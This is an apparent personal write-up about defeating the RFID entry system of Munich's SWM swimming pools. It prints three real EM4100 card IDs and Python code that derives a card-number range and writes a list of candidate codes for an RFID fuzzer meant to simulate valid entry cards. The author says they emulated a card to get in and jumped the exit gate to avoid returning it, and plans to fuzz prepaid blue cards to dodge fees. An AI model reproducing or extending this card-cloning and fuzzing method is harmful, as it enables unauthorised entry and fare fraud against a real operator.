The Munich Pool system ([SWM](https://www.swm.de/baeder/info/standorte-oeffnungszeiten)) employs RFID technology, specifically the EM4100 Type, for entry into their swimming facilities. Visitors have the option to purchase a yellow, single-use card upon arrival, which allows them to access the premises through the revolving metal doors. To operate, simply place the card near the reader, and the door will unlock, granting entry. Additionally, there is a blue card available that can be preloaded with funds. With each visit, the entrance fee is automatically deducted from the card's balance, *depending on the amount of time spent in the pool*, we'll get back to this in a second.

First we'll run some exploratory analysis of the scanned RFID data. Here's the raw data of three yellow card I currently have. 

```python
# Sample RFID codes in hex format
card1 = "01:14:fa:8a:6b"
card2 = "01:14:fa:86:97"
card3 = "01:14:fa:f3:d0"
```

```python
# Function to analyze gaps between the variable parts of the RFID codes
def analyze_hex_gaps(*codes):
    # Extracting the variable hex parts (assuming they start after the third colon) and converting to integers
    numbers = [int(code.replace(':', '')[6:], 16) for code in codes]  # Removing colons and converting
    numbers.sort()  # Sorting to analyze the gaps in a sequence
    gaps = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
    return gaps

# Function to find the common prefix among the codes
def find_common_prefix(*codes):
    prefix = codes[0]
    for code in codes[1:]:
        i = 0
        while i < len(prefix) and i < len(code) and prefix[i] == code[i]:
            i += 1
        prefix = prefix[:i]
    return prefix

# Function to find the common suffix among the codes
def find_common_suffix(*codes):
    suffix = codes[0][::-1]  # Reverse the first code for comparison
    for code in codes[1:]:
        code = code[::-1]  # Reverse the code for comparison
        i = 0
        while i < len(suffix) and i < len(code) and suffix[i] == code[i]:
            i += 1
        suffix = suffix[:i]
    return suffix[::-1]  # Reverse back to original order

def decode(*codes, common_prefix, common_suffix):
    decoded_segments = []
    for code in codes:
        # Remove the common prefix and suffix
        middle_segment = code[len(common_prefix):len(code)-len(common_suffix)]
        # Remove colons and convert from hex to int
        decoded_segment = int(middle_segment.replace(':', ''), 16)
        decoded_segments.append(decoded_segment)
    return decoded_segments

# Analyzing gaps in the variable hex parts
hex_gaps = analyze_hex_gaps(card1, card2, card3)
# Find the common prefix and suffix
common_prefix = find_common_prefix(card1, card2, card3)
common_suffix = find_common_suffix(card1, card2, card3)

# Decode the variable middle segments to integers
decoded_segments = decode(card1, card2, card3, common_prefix=common_prefix, common_suffix=common_suffix)

decoded_segments.sort()
min_value, max_value = decoded_segments[0], decoded_segments[-1]
steps = [decoded_segments[i+1] - decoded_segments[i] for i in range(len(decoded_segments)-1)]
min_step = min(steps)    

```
Regardless, the code can also detect different types of patterns itself. The subsequent data appears to represent a unique card number in hex16 format. For example, the following card numbers have been decoded to:

```python
decoded_segments = [int("8a6b", 16), int("8697", 16), int("f3d0", 16)]
decoded_segments
> [35435, 34455, 62416]
```
Assuming these 3 are valid, let's think of a way to generate similar numbers that could potentially be used in an RFID fuzzer to simulate a valid entry-card into the pool facilities. Here's a proposed function for generating a sequence of numbers to fuzz rapidly:
```python
# Function to generate the sequence
def generate_sequence(min_value, max_value, step):
    return range(min_value, max_value + 1, step)
# Generate the sequence of RFID codes
sequence = generate_sequence(min_value, max_value, min_step)
common_prefix = '01 14 FA' # from earlier
# Write to a text file
filename = "gelb_swm_rfid.txt"
with open(filename, "w") as file:
    file.write("# Generated RFID codes\n")
    for value in sequence:
        code = f"{common_prefix.replace(':','').upper()}{value:04X}"
        if code not in [card1,card2,card3]:
            file.write(f"\n{code}")  # Adjust formatting as needed
    file.write("\n")  # Empty line at the end
```

And so, the blue cards seem start with `01 16 6F`, or at least my one does. I ain't giving the rest of my card, but there should be a way to fuzz these too. These should also be more valuable because when you have a yellow card you're suppose to give it to the machine when leaving and it doesn't give it back to you. So it might even be necessary to input the yellow card in order to leave the premise. However, if we spoof blue cards, that you're suppose to take with you on the way in and on the way out. 

It is clear to me that they don't write anything on the cards. These are simply used as identification mechanisms, however how long one stays in the pool is a factor for the amount of money deduced from the card. 

I've already tried emulating card1 and got in the facilities, however seemlessly jumped the exit gate late at night close to closing time on exit because i didn't want to have to give up the yellow card on exit. But the other day I tried emulating the card1 again and it wouldn't let me pass, somehow it knows it hasn't gotten out of the facility yet so it's not yet valid. If I return card1 and next time emulate card1 again-> I guess it should work? 

I wonder what happens when you enter with a yellow card and exit with a blue card. like how much do they deduce if they don't know how long i've stayed there for? So what if I fuzz yellow on enter and blue on exit. That could be an interesting result. 

